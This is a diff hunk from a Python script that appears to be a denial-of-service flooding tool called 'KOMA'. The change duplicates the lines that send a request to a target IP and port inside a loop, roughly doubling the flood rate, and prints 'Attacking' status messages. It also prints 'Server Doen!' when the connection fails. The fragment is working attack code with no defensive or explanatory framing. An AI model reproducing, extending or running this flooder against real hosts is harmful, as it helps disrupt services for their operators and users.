@@ -97,8 +97,11 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[+\033[96m]\033[33mKOMA---\033[92mAttacking {0}:{1}" +str()+ "\033[97mSent::... {2}\033[0m".format(str(ip), int(port), xx))
-
+                print("\033[96m[+\033[96m]\033[33mKOMA_\033[92mAttacking {0}:{1}" +str()+ "\033[97mSent::.. {2}\033[0m".format(str(ip), int(port), xx))
+                s.send(str.encode(main_req))
+                xx += random.randint(0, int(packs))
+                print("\033[96m[+\033[96m]\033[33mKOMA_\033[92mAttacking {0}:{1}" +str()+ "\033[97mSent:::... {2}\033[0m".format(str(ip), int(port), xx))
+        
         except:
                s.close()
                print("[+]Server Doen!.")
